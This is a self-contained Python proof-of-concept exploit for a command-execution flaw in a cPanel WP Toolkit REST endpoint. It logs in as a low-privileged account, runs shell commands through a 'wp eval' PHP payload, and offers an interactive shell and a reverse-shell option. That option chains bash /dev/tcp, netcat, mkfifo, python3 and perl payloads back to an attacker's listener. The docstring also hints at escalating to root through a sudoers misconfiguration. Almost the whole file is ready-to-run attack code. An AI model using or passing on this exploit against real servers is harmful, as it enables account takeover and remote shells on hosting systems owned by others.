#!/usr/bin/env python3
"""
wpt_wpcli_rce.py — cPanel WP Toolkit "wp-cli" REST endpoint RCE PoC.

Works with ONLY a low-privileged cPanel account's own username/password.
No root, no SSH, no WHM access required.

Root cause: WP Toolkit's native REST API

    POST /<cpsess>/3rdparty/wpt/index.php/v1/installations/{id}/features/wp-cli

executes an arbitrary wp-cli subcommand against a WordPress installation the
calling cPanel account owns. Unlike the legacy WpToolkitCli::execute_command
UAPI/CLI path (gated by the closed-source "NotRootGate" check), this REST
endpoint enforces no additional authorization beyond a normal, valid cPanel
login session.

`wp eval` runs arbitrary PHP, so shell_exec()/system() gives full command
execution AS THE CPANEL ACCOUNT (not root -- escalating the "wp-toolkit"
service account itself to root via its sudoers.d/48-wp-toolkit
"ALL=(ALL) NOPASSWD:ALL" misconfiguration is a separate, only partially
confirmed chain and is intentionally NOT implemented here).

Usage:
    # one-off command
    python3 wpt_wpcli_rce.py -H 84.247.20.213:2083 -u user1 -p 'TestExploit!2026Aa' -c 'id; whoami; uname -a'
    python3 wpt_wpcli_rce.py -H 84.247.20.213:2083 -u user1 -p '...' -c 'id' -i 1

    # interactive shell (no listener needed -- drops straight into a prompt)
    python3 wpt_wpcli_rce.py -H 84.247.20.213:2083 -u user1 -p '...'
    python3 wpt_wpcli_rce.py -H 84.247.20.213:2083 -u user1 -p '...' -s

    # classic reverse shell (needs your own listener, e.g. nc -lvnp 4444)
    python3 wpt_wpcli_rce.py -H 84.247.20.213:2083 -u user1 -p '...' -r 10.0.0.5:4444

With no -c and no -r, the script drops directly into an interactive shell
built on top of the RCE primitive: every line you type is executed on the
target and its output printed back. No separate listener and no inbound
connectivity are required (unlike -r), which makes it work through NAT.
The shell runs AS THE CPANEL ACCOUNT (user1), the identity the wp-cli
endpoint drops to.

Requires: only the Python 3 standard library.
"""

import argparse
import base64
import http.client
import http.cookiejar
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request


def build_opener():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx),
    )
    return opener


def http_request(opener, url, data=None, headers=None, method=None):
    headers = headers or {}
    if data is not None and not isinstance(data, (bytes, bytearray)):
        data = data.encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    with opener.open(req, timeout=20) as resp:
        return resp.status, resp.read().decode("utf-8", errors="replace")


def login(opener, base, user, password):
    url = f"{base}/login/?login_only=1"
    body = urllib.parse.urlencode({"user": user, "pass": password})
    status, text = http_request(
        opener, url, data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    try:
        resp = json.loads(text)
    except json.JSONDecodeError:
        print(f"[-] Unexpected login response: {text}", file=sys.stderr)
        sys.exit(1)

    if resp.get("status") != 1:
        print(f"[-] Login failed: {resp}", file=sys.stderr)
        sys.exit(1)

    token = resp["security_token"]
    print(f"[+] Authenticated. Session token: {token}", file=sys.stderr)
    return token


def discover_installation_id(opener, base, cpsess):
    url = f"{base}{cpsess}/3rdparty/wpt/index.php/v1/installations"
    status, text = http_request(opener, url)
    try:
        installs = json.loads(text)
    except json.JSONDecodeError:
        print(f"[-] Could not parse installations list: {text}", file=sys.stderr)
        sys.exit(1)

    if not installs:
        print("[-] No WP Toolkit installation found for this account.", file=sys.stderr)
        print("    Install any WordPress site via cPanel > WordPress Toolkit first, "
              "or pass -i <id>.", file=sys.stderr)
        sys.exit(1)

    inst_id = installs[0]["id"]
    print(f"[+] Using installation id={inst_id} ({installs[0].get('displayTitle', '')})",
          file=sys.stderr)
    return inst_id


def run_command(opener, base, cpsess, install_id, shell_cmd, quiet=False):
    # Base64-wrap the command so no PHP/JSON/shell quoting can break out or
    # need manual escaping -- arbitrary bytes survive intact.
    b64cmd = base64.b64encode(shell_cmd.encode("utf-8")).decode("ascii")
    php_payload = f"echo shell_exec(base64_decode('{b64cmd}'));"

    body = json.dumps({"command": ["eval", php_payload]})
    url = f"{base}{cpsess}/3rdparty/wpt/index.php/v1/installations/{install_id}/features/wp-cli"

    if not quiet:
        print("[*] Executing command via wp-cli REST endpoint ...", file=sys.stderr)
    status, text = http_request(
        opener, url, data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    if not quiet:
        print(f"[+] Raw response: {text}", file=sys.stderr)
    try:
        resp = json.loads(text)
    except json.JSONDecodeError:
        if not quiet:
            print("[-] Non-JSON response, printing raw body above.", file=sys.stderr)
            sys.exit(1)
        return "", f"[non-JSON response] {text}", None

    return resp.get("stdout", ""), resp.get("stderr", ""), resp.get("exitCode")


def interactive_shell(opener, base, cpsess, install_id):
    # A pseudo-shell over the stateless RCE primitive. Each line is run in a
    # fresh process on the target, so we carry the working directory across
    # calls ourselves: cd into the tracked cwd, run the command, then emit a
    # sentinel followed by the new pwd and parse it back off the output.
    import shlex

    sentinel = "___WPTSHELL_PWD___"
    cwd = None  # None => let the first command land in the account's default dir

    print("[*] Interactive shell ready. Type commands; 'exit' or Ctrl-D to quit.",
          file=sys.stderr)

    # Prime cwd from the target's default landing directory.
    stdout, _, _ = run_command(opener, base, cpsess, install_id,
                               f"pwd; echo {sentinel}", quiet=True)
    cwd = (stdout.split(sentinel)[0].strip() or ".") if stdout else "."
    print(f"[+] Shell as: ", end="", file=sys.stderr)
    who, _, _ = run_command(opener, base, cpsess, install_id, "id", quiet=True)
    print(who.strip(), file=sys.stderr)

    while True:
        try:
            line = input(f"{cwd} $ ")
        except EOFError:
            print(file=sys.stderr)
            break
        cmd = line.strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            break

        # cd is handled by us (it can't persist in a child), everything else
        # runs under the tracked cwd. We always re-emit pwd so a command that
        # itself changes directory (e.g. `cd x && ...`) updates our state too.
        wrapped = (
            f"cd {shlex.quote(cwd)} 2>/dev/null; "
            f"{cmd}\n"
            f"printf '%s' {sentinel}; pwd"
        )
        stdout, stderr, _ = run_command(opener, base, cpsess, install_id, wrapped, quiet=True)

        out = stdout if stdout is not None else ""
        if sentinel in out:
            body, _, newpwd = out.rpartition(sentinel)
            newpwd = newpwd.strip()
            if newpwd:
                cwd = newpwd
            sys.stdout.write(body)
            if body and not body.endswith("\n"):
                sys.stdout.write("\n")
        else:
            sys.stdout.write(out)
        if stderr:
            sys.stderr.write(stderr)
        sys.stdout.flush()


def build_reverse_shell_cmd(lhost, lport):
    # Fire the reverse shell in the background (setsid + &) so the HTTP
    # request returns immediately instead of hanging on the wp-cli call.
    # Several fallbacks are tried in order so the payload works regardless
    # of which interpreters the account has: bash /dev/tcp, then nc, then
    # python3, then perl.
    payloads = [
        f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        f"nc -e /bin/sh {lhost} {lport}",
        f"rm -f /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/.f",
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"subprocess.call([\"/bin/sh\",\"-i\"])'",
        f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        f"connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");"
        f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    ]
    # Try each in turn; setsid detaches so the request comes back cleanly.
    chain = " || ".join(f"({p})" for p in payloads)
    return f"setsid sh -c {shell_single_quote(chain)} >/dev/null 2>&1 &"


def shell_single_quote(s):
    return "'" + s.replace("'", "'\\''") + "'"


def main():
    ap = argparse.ArgumentParser(
        description="cPanel WP Toolkit wp-cli REST RCE PoC (low-privileged account only)."
    )
    ap.add_argument("-H", "--host", required=True, help="target host[:port], e.g. 84.247.20.213:2083")
    ap.add_argument("-u", "--user", required=True, help="cPanel username")
    ap.add_argument("-p", "--password", required=True, help="cPanel password")
    ap.add_argument("-c", "--command", help="run a single shell command and exit")
    ap.add_argument("-s", "--shell", action="store_true",
                     help="interactive shell (default when neither -c nor -r is given)")
    ap.add_argument("-r", "--reverse", metavar="LHOST:LPORT",
                     help="fire a classic reverse shell to your own listener")
    ap.add_argument("-i", "--install-id", type=int, default=None,
                     help="WP Toolkit installation id (auto-discovered if omitted)")
    args = ap.parse_args()

    host = args.host if ":" in args.host else f"{args.host}:2083"
    base = f"https://{host}"

    opener = build_opener()

    print(f"[*] Logging in to {base} as '{args.user}' ...", file=sys.stderr)
    cpsess = login(opener, base, args.user, args.password)

    install_id = args.install_id
    if install_id is None:
        install_id = discover_installation_id(opener, base, cpsess)

    if args.reverse:
        if ":" not in args.reverse:
            ap.error("--reverse must be LHOST:LPORT")
        lhost, lport = args.reverse.rsplit(":", 1)
        cmd = build_reverse_shell_cmd(lhost, lport)
        print(f"[*] Firing reverse shell to {lhost}:{lport} (make sure your listener is up) ...",
              file=sys.stderr)
        run_command(opener, base, cpsess, install_id, cmd)
        print("[+] Payload sent. Check your listener for the incoming shell (running as the cPanel user).",
              file=sys.stderr)
        return

    if args.command:
        stdout, stderr, exit_code = run_command(opener, base, cpsess, install_id, args.command)
        print("\n----- COMMAND OUTPUT -----")
        sys.stdout.write(stdout)
        if stderr:
            sys.stderr.write(stderr)
        print("---------------------------")
        return

    # Default: interactive shell (no listener, no inbound connection needed).
    interactive_shell(opener, base, cpsess, install_id)


if __name__ == "__main__":
    main()
